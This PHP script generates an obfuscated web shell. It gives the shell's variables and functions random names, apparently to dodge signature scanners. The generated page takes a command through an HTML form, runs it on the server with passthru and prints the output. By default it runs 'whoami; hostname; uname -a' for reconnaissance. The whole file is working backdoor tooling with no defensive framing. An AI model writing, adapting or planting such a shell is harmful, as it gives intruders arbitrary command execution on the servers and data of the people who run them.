#!/usr/bin/php

<?php

function make_random_name(){

	// making some randomness
	$name = rand() * rand();
	$name = hash("whirlpool", $name);
	$name = crypt($name);

	// shorten
	$name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);

	// rm leading numbers
	$name = preg_replace('/^[0-9]+/', '', $name);

	// make sure the regex didn't leave us an empty string
	return ($name = NULL? make_random_name(): $name);
}

$_2233 = array(
	"eval_function" => make_random_name(),
	"eval_arg" => make_random_name(),
	"html_console_tag" => make_random_name(),
	"post_2233" => make_random_name(),
	"post_command" => make_random_name(),
	"script_name" => make_random_name(),
	"no_command" => '"whoami; hostname; uname -a"',
	"page_html" => make_random_name(),
	);
/*
for ($i=0; $i<=10; $i++){
	$_2233[$i] = make_random_name();
}
*/
echo '
<?php

$'.$_2233['page_html'].' = <<< EOF
<html>
	<head>
		<style>
			input{ background-color: rgb(255, 255, 255); width: 50%;}
			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
			body{ background-color: rgb(250, 250, 250);}
			'.$_2233['html_console_tag'].'{ color: rgb(170, 170, 170);}
		</style>
	</head>
	<body>
		<form action="'.$_2233['script_name'].'" id="form" method="POST">
			<span>$ </span>
			<input type="text" name="'.$_2233['post_2233'].'" autocomplete="off" autofocus>
			<span> 2&gt;&amp;1 </span>
			<button type="submit">$$$</button>
		</form>
	<code>
<pre>
EOF;

function '.$_2233['eval_function'].'($'.$_2233['eval_arg'].'){
	echo "<'.$_2233['html_console_tag'].'>$ ".$'.$_2233['eval_arg'].'."</'.$_2233['html_console_tag'].'><br>";
	echo passthru($'.$_2233['eval_arg'].'." 2>&1");
}
$'.$_2233['post_command'].'=$_POST["'.$_2233['post_2233'].'"];
echo preg_replace('."'/".$_2233['script_name']."/'".', '."basename(\$_SERVER[\"SCRIPT_NAME\"]), $".$_2233['page_html'].');

if (isset($'.$_2233['post_command'].')){
	'.$_2233['eval_function'].'($'.$_2233['post_command'].');
}
else {
	'.$_2233['eval_function'].'('.$_2233['no_command'].');
}
?>';

?>